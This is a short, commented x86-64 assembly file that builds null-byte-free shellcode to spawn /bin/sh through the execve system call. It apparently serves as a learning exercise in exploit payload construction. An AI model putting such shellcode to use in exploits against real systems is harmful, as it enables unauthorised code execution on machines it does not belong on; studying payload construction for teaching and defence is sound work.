### Program to start a shell in 64 bit assembly.
.section .data		# data section
.section .text		# text section.

.globl _start		

_start:

movq $0x2268732f6e69622f, %rbx # loading 22/bin/sh. Will left shift to drop 22.
shl $0x08, %rbx		       # left shift	
shr $0x08, %rbx		       # Right Shift	

##pushq $0		# Pushing parm in reverse.
##pushq name		# Pushing 1st Parm(string)	
pushq %rbx		# Pushing rbx into stack tp push parameter.

#movq $59, %rax		# Prepraing to do system call for execv to invoke shell.
mov $0x2222223b, %rax	# loading 59 to rax register. Will drop 222222
shl $0x38, %rax
shr $0x38, %rax
movq %rsp, %rdi	

##movq $0, %rsi		# populating null.
xor %rsi, %rsi		# xoring removes 0 values.
##movq $0, %rdx
xor %rdx, %rdx		# Xoring removes 0 values.

syscall			# Actual System call.

##movq $60, %rax		# Preparing to do exit system call.
mov $0x2222223c, %rax
shl $0x38, %rax
shr $0x38, %rax

##movq $0, %rdi
xor %rdi, %rdi
syscall			# actual system call


